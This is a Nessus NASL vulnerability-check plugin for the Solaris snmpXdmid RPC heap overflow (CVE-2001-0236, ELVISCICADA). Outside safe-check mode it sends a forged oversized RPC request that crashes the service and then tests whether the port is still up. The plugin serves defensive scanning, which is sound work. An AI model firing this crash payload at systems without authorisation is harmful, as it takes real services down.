#
# This script is released under the GPL
#

# Changes by Tenable:
# - Revised plugin title, changed family, output formatting touch-ups (8/20/09)
# - Updated to use compat.inc, added CVSS score used extra instead of data arg in security_hole (11/20/2009)

include("compat.inc");

if (description)
{
 script_id(10659);
 script_version("$Revision: 1.32 $");
 script_cvs_date("$Date: 2017/04/19 13:27:09 $");

 script_cve_id("CVE-2001-0236");
 script_bugtraq_id(2417);
 script_osvdb_id(546);
 script_xref(name:"CERT", value:"648304");
 script_xref(name:"EDB-ID", value:"20648");
 script_xref(name:"EDB-ID", value:"20649");

 script_name(english:"Solaris snmpXdmid Long Indication Event Overflow (ELVISCICADA)");
 script_summary(english:"heap overflow through snmpXdmid");

 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a heap overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote RPC service 100249 (snmpXdmid) is vulnerable to a heap
overflow which allows any user to obtain a root shell on this host.

ELVISCICADA is one of multiple Equation Group vulnerabilities and
exploits disclosed on 2017/04/08 by a group known as the Shadow
Brokers.");
 script_set_attribute(attribute:"solution", value:
"Disable this service (/etc/init.d/init.dmi stop) if you don't use it,
or contact Sun for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/03/14");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/05/03");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"in_the_news", value:"true");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_copyright(english:"This script is Copyright (C) 2001-2017 Intranode");
 script_family(english:"Gain a shell remotely");

 script_dependencies("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("sunrpc_func.inc");


port = get_rpc_port2(program:100249, protocol:IPPROTO_TCP);
if (port)
{
  if(safe_checks())
  {
   if (report_paranoia < 2) audit(AUDIT_PARANOID);
 report = "
The remote RPC service 100249 (snmpXdmid) may be vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.";

  security_hole(port:port, extra:report);
  exit(0);
  }


  if(get_port_state(port))
  {
   soc = open_sock_tcp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x00, 0x00, 0x0F, 0x9C, 0x22, 0x7D,
	  	  0x93, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x02, 0x00, 0x01, 0x87, 0x99, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x20, 0x3A, 0xF1,
		  0x28, 0x90, 0x00, 0x00, 0x00, 0x09, 0x6C, 0x6F,
		  0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x06, 0x44, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00) +
		  crap(length:28000, data:raw_string(0x00));


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     sleep(1);
     soc2 = open_sock_tcp(port);
     if(!soc2)security_hole(port);
     else close(soc2);
   }
 }
}
